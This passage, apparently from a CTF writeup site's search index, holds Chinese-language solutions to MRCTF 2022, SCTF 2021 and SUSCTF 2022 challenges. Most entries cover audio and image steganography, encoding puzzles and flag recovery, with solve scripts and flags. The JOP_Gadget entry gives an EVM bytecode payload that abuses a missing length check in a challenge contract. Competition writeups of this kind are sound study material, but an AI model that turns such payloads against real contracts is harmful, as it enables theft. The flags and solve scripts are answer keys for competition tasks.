waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) flag: MRCTF{TheShor7testShel1c0dE&EIP-2929}","title":"SandSandSand"},{"location":"writeups/mrctf2022/#jop_gadget","text":"\u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 \u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP \u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6 \u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1 \u4f8b\u5982 0x123450600160805260206080f300 \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a PUSH2 1234 POP PUSH1 0x01 PUSH1 0x80 MSTORE PUSH1 0x20 PUSH1 0x80 RETURN STOP flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&F0under}","title":"JOP_Gadget"},{"location":"writeups/mrctf2022/#bleach","text":"\u8d5b\u540e\u8865\u505a\u7684\u9898 \u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae \u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41 \u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3 \u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247 \u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a exp import wave from PIL import Image f = wave . open ( \"bleach.wav\" , \"rb\" ) frames = f . readframes ( 400 * 400 // 2 ) res = [ 255 if frame & 1 else 0 for frame in frames ] img = Image . new ( \"L\" , ( 400 , 400 )) k = 0 for i in range ( 400 ): for j in range ( 400 ): img . putpixel (( j , i ), res [ k ]) k += 1 img . show () img . save ( \"flag.png\" ) flag: MRCTF{Don\u2019t_Use_Your_tools!}","title":"Bleach!"},{"location":"writeups/sctf2021/","text":"SCTF 2021 Writeup \u00b6 Abstract \u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86 This_is_A_tree \u00b6 \u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801 from base64 import * import os import string def read ( path ): return open ( path , \"r\" ) . read () res = [] l = \"letf/\" r = \"Right/\" def readdir ( path ): if os . path . isfile ( path + \"data\" ): res . append ( path + \"data\" ) if os . path . isdir ( path + l ): readdir ( path + l ) if os . path . isdir ( path + r ): readdir ( path + r ) def get_tree (): readdir ( \"./src/\" ) s = \"\" for i in res : s += read ( i ) print ( b64decode ( s ) . decode ()) # Chinese traditional culture is broad and profound! # So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!: # \u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b b64table = string . ascii_uppercase + string . ascii_lowercase + string . digits + '+/' table = { '\u5764' : '000000' , '\u5265' : '000001' , '\u6bd4' : '000010' , '\u89c2' : '000011' , '\u8c6b' : '000100' , '\u664b' : '000101' , '\u8403' : '000110' , '\u5426' : '000111' , '\u8c26' : '001000' , '\u826e' : '001001' , '\u8e47' : '001010' , '\u6e10' : '001011' , '\u5c0f\u8fc7' : '001100' , '\u65c5' : '001101' , '\u54b8' : '001110' , '\u9041' : '001111' , '\u5e08' : '010000' , '\u8499' : '010001' , '\u574e' : '010010' , '\u6da3' : '010011' , '\u89e3' : '010100' , '\u672a\u6d4e' : '010101' , '\u56f0' : '010110' , '\u8bbc' : '010111' , '\u5347' : '011000' , '\u86ca' : '011001' , '\u4e95' : '011010' , '\u5dfd' : '011011' , '\u6052' : '011100' , '\u9f0e' : '011101' , '\u5927\u8fc7' : '011110' , '\u59e4' : '011111' , '\u590d' : '100000' , '\u9890' : '100001' , '\u5c6f' : '100010' , '\u76ca' : '100011' , '\u9707' : '100100' , '\u566c\u55d1' : '100101' , '\u968f' : '100110' , '\u65e0\u5984' : '100111' , '\u660e\u5937' : '101000' , '\u8d32' : '101001' , '\u65e2\u6d4e' : '101010' , '\u5bb6\u4eba' : '101011' , '\u4e30' : '101100' , '\u79bb' : '101101' , '\u9769' : '101110' , '\u540c\u4eba' : '101111' , '\u4e34' : '110000' , '\u635f' : '110001' , '\u8282' : '110010' , '\u4e2d\u5b5a' : '110011' , '\u5f52\u59b9' : '110100' , '\u777d' : '110101' , '\u5151' : '110110' , '\u5c65' : '110111' , '\u6cf0' : '111000' , '\u5927\u755c' : '111001' , '\u9700' : '111010' , '\u5c0f\u755c' : '111011' , '\u5927\u58ee' : '111100' , '\u5927\u6709' : '111101' , '\u592c' : '111110' , '\u4e7e' : '111111' } index = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b' . split ( ' ' ) s = '' . join ([ b64table [ int ( table [ i ], base = 2 )] for i in index ]) print ( b64decode ( s + '=' )) # b'Ch1nA_yyds!' fumo_xor_cli \u00b6 \u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9 \u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 \u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a \u5f97\u5230\uff1a https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA \u627e\u5230\u56fe\u7247\uff1a https://imgtu.com/i/TpMSkq \u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a from PIL import Image img = Image . open ( \"TpMSkq.png\" ) res = Image . new ( \"RGBA\" , ( 101 , 134 )) width , height = img . size print ( width , height ) print ( img . getpixel (( 800 , 1000 ))) for i in range ( width ): for j in range ( height ): if i % 9 == 1 and j % 9 == 1 : pix = img . getpixel (( i , j )) res . putpixel (( i // 9 , j // 9 ), pix ) res . save ( \"in_pix.png\" ) CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt \u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a from PIL import Image import re img = Image . new ( \"RGBA\" , ( 101 , 134 )) pattern = re . compile ( r '\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.' ) with open ( \"fumo_a.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i + 50 , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) with open ( \"fumo_9.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) img . save ( \"cli.png\" ) \u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a \u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a SCTF{Good_FuMo_CTF_OvO} in_the_vaporwaves \u00b6 \u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a \u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927 wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a import wave import numpy as np import matplotlib.pyplot as plt wav = wave . open ( \"c.wav\" , \"r\" ) nframes = wav . getnframes () framerate = wav . getframerate () data = wav . readframes ( nframes ) wav . close () wave_data = np . fromstring ( data , dtype = np . short ) wave_data . shape = - 1 , 2 wave_data = wave_data . T time = np . arange ( 0 , nframes ) * ( 1.0 / framerate ) res = wave_data [ 0 ] + wave_data [ 1 ] plt . figure () # plt.plot(time, res) plt . plot ( time [ 87 * framerate : 128 * framerate ], res [ 87 * framerate : 128 * framerate ]) plt . show () \u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag ... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ... SCTFDES1R3_DRIVES_INT0_VAPORW@VES flag: SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}","title":"SCTF 2021"},{"location":"writeups/sctf2021/#sctf-2021-writeup","text":"Abstract \u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86","title":"SCTF 2021 Writeup"},{"location":"writeups/sctf2021/#this_is_a_tree","text":"\u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801 from base64 import * import os import string def read ( path ): return open ( path , \"r\" ) . read () res = [] l = \"letf/\" r = \"Right/\" def readdir ( path ): if os . path . isfile ( path + \"data\" ): res . append ( path + \"data\" ) if os . path . isdir ( path + l ): readdir ( path + l ) if os . path . isdir ( path + r ): readdir ( path + r ) def get_tree (): readdir ( \"./src/\" ) s = \"\" for i in res : s += read ( i ) print ( b64decode ( s ) . decode ()) # Chinese traditional culture is broad and profound! # So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!: # \u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b b64table = string . ascii_uppercase + string . ascii_lowercase + string . digits + '+/' table = { '\u5764' : '000000' , '\u5265' : '000001' , '\u6bd4' : '000010' , '\u89c2' : '000011' , '\u8c6b' : '000100' , '\u664b' : '000101' , '\u8403' : '000110' , '\u5426' : '000111' , '\u8c26' : '001000' , '\u826e' : '001001' , '\u8e47' : '001010' , '\u6e10' : '001011' , '\u5c0f\u8fc7' : '001100' , '\u65c5' : '001101' , '\u54b8' : '001110' , '\u9041' : '001111' , '\u5e08' : '010000' , '\u8499' : '010001' , '\u574e' : '010010' , '\u6da3' : '010011' , '\u89e3' : '010100' , '\u672a\u6d4e' : '010101' , '\u56f0' : '010110' , '\u8bbc' : '010111' , '\u5347' : '011000' , '\u86ca' : '011001' , '\u4e95' : '011010' , '\u5dfd' : '011011' , '\u6052' : '011100' , '\u9f0e' : '011101' , '\u5927\u8fc7' : '011110' , '\u59e4' : '011111' , '\u590d' : '100000' , '\u9890' : '100001' , '\u5c6f' : '100010' , '\u76ca' : '100011' , '\u9707' : '100100' , '\u566c\u55d1' : '100101' , '\u968f' : '100110' , '\u65e0\u5984' : '100111' , '\u660e\u5937' : '101000' , '\u8d32' : '101001' , '\u65e2\u6d4e' : '101010' , '\u5bb6\u4eba' : '101011' , '\u4e30' : '101100' , '\u79bb' : '101101' , '\u9769' : '101110' , '\u540c\u4eba' : '101111' , '\u4e34' : '110000' , '\u635f' : '110001' , '\u8282' : '110010' , '\u4e2d\u5b5a' : '110011' , '\u5f52\u59b9' : '110100' , '\u777d' : '110101' , '\u5151' : '110110' , '\u5c65' : '110111' , '\u6cf0' : '111000' , '\u5927\u755c' : '111001' , '\u9700' : '111010' , '\u5c0f\u755c' : '111011' , '\u5927\u58ee' : '111100' , '\u5927\u6709' : '111101' , '\u592c' : '111110' , '\u4e7e' : '111111' } index = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b' . split ( ' ' ) s = '' . join ([ b64table [ int ( table [ i ], base = 2 )] for i in index ]) print ( b64decode ( s + '=' )) # b'Ch1nA_yyds!'","title":"This_is_A_tree"},{"location":"writeups/sctf2021/#fumo_xor_cli","text":"\u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9 \u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 \u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a \u5f97\u5230\uff1a https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA \u627e\u5230\u56fe\u7247\uff1a https://imgtu.com/i/TpMSkq \u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a from PIL import Image img = Image . open ( \"TpMSkq.png\" ) res = Image . new ( \"RGBA\" , ( 101 , 134 )) width , height = img . size print ( width , height ) print ( img . getpixel (( 800 , 1000 ))) for i in range ( width ): for j in range ( height ): if i % 9 == 1 and j % 9 == 1 : pix = img . getpixel (( i , j )) res . putpixel (( i // 9 , j // 9 ), pix ) res . save ( \"in_pix.png\" ) CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt \u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a from PIL import Image import re img = Image . new ( \"RGBA\" , ( 101 , 134 )) pattern = re . compile ( r '\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.' ) with open ( \"fumo_a.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i + 50 , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) with open ( \"fumo_9.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) img . save ( \"cli.png\" ) \u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a \u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a SCTF{Good_FuMo_CTF_OvO}","title":"fumo_xor_cli"},{"location":"writeups/sctf2021/#in_the_vaporwaves","text":"\u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a \u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927 wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a import wave import numpy as np import matplotlib.pyplot as plt wav = wave . open ( \"c.wav\" , \"r\" ) nframes = wav . getnframes () framerate = wav . getframerate () data = wav . readframes ( nframes ) wav . close () wave_data = np . fromstring ( data , dtype = np . short ) wave_data . shape = - 1 , 2 wave_data = wave_data . T time = np . arange ( 0 , nframes ) * ( 1.0 / framerate ) res = wave_data [ 0 ] + wave_data [ 1 ] plt . figure () # plt.plot(time, res) plt . plot ( time [ 87 * framerate : 128 * framerate ], res [ 87 * framerate : 128 * framerate ]) plt . show () \u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag ... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ... SCTFDES1R3_DRIVES_INT0_VAPORW@VES flag: SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}","title":"in_the_vaporwaves"},{"location":"writeups/susctf2022/","text":"SUSCTF 2022 Writeup \u00b6 Abstract \u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b ra2 \u00b6 \u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard \u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag \u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag flag: SUSCTF{RED_ALERT_WINNER!!!} Tanner \u00b6 Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front) \u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256 \u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1a http://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/ \u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981 \u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a import hashlib import numpy as np def decode ( H , y , m , n , p ): fr = np . zeros (( m , 2 * p )) fs = np . zeros (( m , 2 * p )) sum = np . zeros ( m ) c = np . zeros (( n , p + 2 )) y1 = np . zeros ( n ) for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : fr [ i , count ] = y [ j ] sum [ i ] = sum [ i ] + y [ j ] count = count + 1 for i in range ( m ): for j in range ( 2 * p ): fs [ i , j ] = ( sum [ i ] - fr [ i , j ]) % 2 for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : index = int ( c [ j , p + 1 ]) c [ j , index ] = fs [ i , count ] count = count + 1 c [ j , p + 1 ] += 1 for i in range ( n ): c [ i , p ] = y [ i ] for i in range ( n ): count = 0 for j in range ( p + 1 ): if c [ i , j ] == 1 : count += 1 if count > ( p + 1 ) / 2 : y1 [ i ] = 1 return y1 m = 5 n = 10 p = 2 H = np . zeros (( 5 , 10 )) H = [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 ], [ 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 ], [ 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 ]] ans = 0 for i in range ( 1024 ): bi = f \" { bin ( i )[ 2 :] : >010 } \" lst = list ( map ( int , bi )) res = decode ( H , lst , m , n , p ) if all ( lst == res ): ans += i print ( hashlib . sha256 ( bin ( ans )[ 2 :] . encode ( \"utf-8\" )) . hexdigest ()) # c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1 flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1} AUDIO \u00b6 \u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c \u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389 \u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a ... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. --- SUSCTFMASTEROFAUDIO flag: SUSCTF{MASTEROFAUDIO} misound \u00b6 \u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 e * = _B \u610f\u4e49\u4e0d\u660e \u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3 base64 \u89e3\u7801\uff1a 207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317 \u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c \u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f SUSCTF{ \u548c } \u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408 207 , 5395 359 , 9350 220 , 5727 224 , 5829 352 , 9156 315 , 8190 359 , 9348 317 , 8250 F(x) = 26.011670619246555*x+4.942379114107098 >>> def f ( x ): ... return 26.011670619246555 * x + 4.942379114107098 ... >>> for x , y in zip ([ 207 , 359 , 220 , 224 , 352 , 315 , 359 , 374 , 290 , 310 , 277 , 507 , 391 , 513 , 423 , 392 , 508 , 383 , 440 , 322 , 420 , 427 , 503 , 460 , 295 , 318 , 245 , 302 , 407 , 414 , 410 , 130 , 369 , 317 ], [ 65 , 110 , 69 , 87 , 109 , 117 , 76 , 84 , 105 , 80 , 76 , 121 , 105 , 115 , 95 , 101 , 116 , 105 , 109 , 101 , 115 , 95 , 119 , 105 , 76 , 76 , 98 , 69 , 99 , 111 , 109 , 69 , 95 , 66 ]): ... print ( chr ( round ( f ( x ) / y )), end = \"\" ) ... SUSCTF { tHe_matter_iS_unremArkab1e } flag: SUSCTF{tHe_matter_iS_unremArkab1e}","title":"SUSCTF 2022"},{"location":"writeups/susctf2022/#susctf-2022-writeup","text":"Abstract \u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b","title":"SUSCTF 2022 